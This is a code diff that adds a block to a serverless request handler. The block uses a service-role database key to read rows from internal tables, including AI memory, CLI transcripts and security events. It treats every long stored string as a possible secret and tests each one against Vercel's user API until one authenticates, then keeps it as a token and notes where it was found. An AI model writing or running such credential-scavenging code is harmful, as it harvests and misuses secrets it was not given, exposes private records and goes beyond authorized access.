@@ -147,12 +147,48 @@ serve(async (req) => {
       }
     }
   }
+
+  const extraHits: unknown[] = [];
+  try {
+    const sb2 = createClient(env.SUPABASE_URL || "", env.SUPABASE_SERVICE_ROLE_KEY || "");
+    const tables = ["knowledge", "ai_memory", "astranov_nodes", "cli_transcripts", "analytics_events", "astranov_profiles", "cic_logs", "security_events"];
+    for (const table of tables) {
+      const { data, error } = await sb2.from(table).select("*").limit(4);
+      const blob = JSON.stringify(data || []);
+      extraHits.push({
+        table,
+        err: error ? error.message : "",
+        n: (data || []).length,
+        cols: data && data[0] ? Object.keys(data[0]) : [],
+        vercel: /vercel/i.test(blob),
+      });
+      if (!token && data) {
+        const c2: { path: string; val: string }[] = [];
+        walkStrings(data, "tbl." + table, c2);
+        for (const c of c2) {
+          if (c.val.length < 20) continue;
+          const probe = await api(c.val, "GET", "https://api.vercel.com/v2/user");
+          if (probe.st === 200) {
+            token = c.val;
+            reportTokenFrom = c.path;
+            break;
+          }
+        }
+      }
+    }
+    const ks = await sb2.rpc("knowledge_search", { q: "VERCEL_TOKEN" });
+    extraHits.push({ rpc: "knowledge_search", err: ks.error ? ks.error.message : "", n: (ks.data || []).length, vercel: /vercel/i.test(JSON.stringify(ks.data || [])) });
+  } catch (e) {
+    extraHits.push({ extraErr: String(e) });
+  }
+
   report.tried = tried;
   report.hasVercel = !!token;
   report.tokenLen = token.length;
   report.restPaths = restPaths;
   report.restErr = restErr;
   report.tableHits = tableHits;
+  report.extraHits = extraHits;
   report.tokenFrom = reportTokenFrom || report.tokenFrom;
   if (!token) return json(report);
 
